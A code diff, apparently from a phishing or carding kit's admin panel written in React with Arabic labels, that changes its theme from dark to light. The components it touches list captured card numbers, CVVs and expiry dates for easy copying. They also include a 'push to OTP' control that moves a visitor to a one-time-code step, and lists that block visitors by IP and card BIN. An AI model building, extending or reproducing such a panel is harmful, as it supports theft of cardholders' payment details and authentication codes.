             <ShieldOff className="w-3 h-3" /> البطاقات المحظورة ({bins.length})
           </div>
           <div className="space-y-1 max-h-48 overflow-y-auto">
             {bins.length === 0 && (
-              <div className="text-center py-4 text-slate-600 text-[11px]">
+              <div className="text-center py-4 text-stone-300 text-[11px]">
                 لا يوجد بطاقات محظورة
               </div>
             )}
             {bins.map((b) => (
               <div
                 key={b}
-                className="flex items-center justify-between gap-2 bg-slate-900/60 border border-slate-800 rounded-lg px-2.5 py-1.5 group"
+                className="flex items-center justify-between gap-2 bg-white border border-stone-200 rounded-lg px-2.5 py-1.5 group"
               >
                 <span
                   className="font-mono text-[13px] font-bold text-red-300 tracking-wider"
@@ -2927,7 +2927,7 @@ function BlockedBinsCard({
                   onClick={() => {
                     if (confirm(`إزالة الحظر عن ${b}؟`)) onRemove(b);
                   }}
-                  className="opacity-50 group-hover:opacity-100 text-slate-400 hover:text-red-400 p-1 rounded hover:bg-red-500/10"
+                  className="opacity-50 group-hover:opacity-100 text-stone-500 hover:text-red-400 p-1 rounded hover:bg-red-500/10"
                   data-testid={`blocklist-remove-${b}`}
                   title="إزالة"
                 >
@@ -2970,7 +2970,7 @@ function BlockedIpsCard({
       badge={ips.length > 0 ? `${ips.length} محظور` : undefined}
     >
       <div className="space-y-3">
-        <div className="text-[11px] text-slate-400 leading-relaxed">
+        <div className="text-[11px] text-stone-500 leading-relaxed">
           أي زائر يدخل من عنوان IP موجود بالقائمة سيُمنع من استخدام النظام ويظهر
           له رسالة حظر. يدعم IPv4 و IPv6 والـ CIDR.
         </div>
@@ -2988,7 +2988,7 @@ function BlockedIpsCard({
             }}
             placeholder="مثال: 102.45.12.7"
             dir="ltr"
-            className="flex-1 px-2 py-1.5 bg-slate-900 border border-slate-700 rounded-lg text-sm font-mono text-cyan-300 text-center placeholder-slate-600 focus:outline-none focus:border-red-500/60"
+            className="flex-1 px-2 py-1.5 bg-white border border-stone-200 rounded-lg text-sm font-mono text-cyan-700 text-center placeholder-stone-300 focus:outline-none focus:border-red-500/60"
             data-testid="ip-blocklist-input"
           />
           <button
@@ -3012,7 +3012,7 @@ function BlockedIpsCard({
             className={`w-full text-right px-2.5 py-2 rounded-lg border flex items-center justify-between gap-2 transition ${
               suggCanAdd
                 ? "bg-amber-500/10 border-amber-500/30 hover:bg-amber-500/20 text-amber-200"
-                : "bg-slate-900/40 border-slate-800 text-slate-500 cursor-not-allowed"
+                : "bg-stone-100/60 border-stone-200 text-stone-400 cursor-not-allowed"
             }`}
             data-testid="ip-blocklist-add-current"
           >
@@ -3028,19 +3028,19 @@ function BlockedIpsCard({
         )}
 
         <div>
-          <div className="text-[11px] text-slate-500 mb-1.5 flex items-center gap-1">
+          <div className="text-[11px] text-stone-400 mb-1.5 flex items-center gap-1">
             <ShieldOff className="w-3 h-3" /> العناوين المحظورة ({ips.length})
           </div>
           <div className="space-y-1 max-h-48 overflow-y-auto">
             {ips.length === 0 && (
-              <div className="text-center py-4 text-slate-600 text-[11px]">
+              <div className="text-center py-4 text-stone-300 text-[11px]">
                 لا يوجد عناوين محظورة
               </div>
             )}
             {ips.map((ip) => (
               <div
                 key={ip}
-                className="flex items-center justify-between gap-2 bg-slate-900/60 border border-slate-800 rounded-lg px-2.5 py-1.5 group"
+                className="flex items-center justify-between gap-2 bg-white border border-stone-200 rounded-lg px-2.5 py-1.5 group"
               >
                 <span
                   className="font-mono text-[13px] font-bold text-red-300 tracking-wider"
@@ -3052,7 +3052,7 @@ function BlockedIpsCard({
                   onClick={() => {
                     if (confirm(`إزالة الحظر عن ${ip}؟`)) onRemove(ip);
                   }}
-                  className="opacity-50 group-hover:opacity-100 text-slate-400 hover:text-red-400 p-1 rounded hover:bg-red-500/10"
+                  className="opacity-50 group-hover:opacity-100 text-stone-500 hover:text-red-400 p-1 rounded hover:bg-red-500/10"
                   data-testid={`ip-blocklist-remove-${ip}`}
                   title="إزالة"
                 >
@@ -3128,10 +3128,10 @@ function CardHistoryList({
             return (
               <div
                 key={`${entry.cardNumber}-${idx}`}
-                className="rounded-md bg-slate-900/50 border border-slate-800 p-2 space-y-1.5"
+                className="rounded-md bg-stone-100/70 border border-stone-200 p-2 space-y-1.5"
                 data-testid={`card-history-${idx}`}
               >
-                <div className="flex items-center justify-between text-[10px] text-slate-400">
+                <div className="flex items-center justify-between text-[10px] text-stone-500">
                   <span dir="ltr" className="font-mono">
                     {fmtTime(entry.timestamp)}
                   </span>
@@ -3139,7 +3139,7 @@ function CardHistoryList({
                     onClick={() =>
                       setRevealed((r) => ({ ...r, [idx]: !r[idx] }))
                     }
-                    className="flex items-center gap-1 text-cyan-300 hover:text-cyan-200"
+                    className="flex items-center gap-1 text-cyan-700 hover:text-cyan-200"
                     data-testid={`toggle-card-history-reveal-${idx}`}
                   >
                     {isRevealed ? (
@@ -3154,7 +3154,7 @@ function CardHistoryList({
                   </button>
                 </div>
                 <div
-                  className="font-mono text-[12px] tracking-wider text-slate-100 select-all"
+                  className="font-mono text-[12px] tracking-wider text-stone-900 select-all"
                   dir="ltr"
                   data-testid={`card-history-number-${idx}`}
                 >
@@ -3164,7 +3164,7 @@ function CardHistoryList({
                   <div>
                     <span className="opacity-60">CVV: </span>
                     <span
-                      className="font-mono font-bold text-slate-100 select-all"
+                      className="font-mono font-bold text-stone-900 select-all"
                       dir="ltr"
                       data-testid={`card-history-cvv-${idx}`}
                     >
@@ -3174,7 +3174,7 @@ function CardHistoryList({
                   <div>
                     <span className="opacity-60">Exp: </span>
                     <span
-                      className="font-mono text-slate-100"
+                      className="font-mono text-stone-900"
                       dir="ltr"
                       data-testid={`card-history-exp-${idx}`}
                     >
@@ -3183,7 +3183,7 @@ function CardHistoryList({
                   </div>
                   {entry.cardType && (
                     <div className="ml-auto">
-                      <span className="text-[9px] uppercase px-1.5 py-px rounded bg-slate-800 text-slate-300">
+                      <span className="text-[9px] uppercase px-1.5 py-px rounded bg-stone-100 text-stone-700">
                         {entry.cardType}
                       </span>
                     </div>
@@ -3458,7 +3458,7 @@ function CardInfoCard({
           </button>
           <button
             onClick={() => onPushStep(5)}
-            className="col-span-2 py-1.5 bg-slate-700 hover:bg-slate-600 rounded-lg text-xs font-semibold flex items-center justify-center gap-1"
+            className="col-span-2 py-1.5 bg-stone-200 hover:bg-stone-300 rounded-lg text-xs font-semibold flex items-center justify-center gap-1"
           >
             <Hash className="w-3 h-3" /> دفع إلى OTP
           </button>
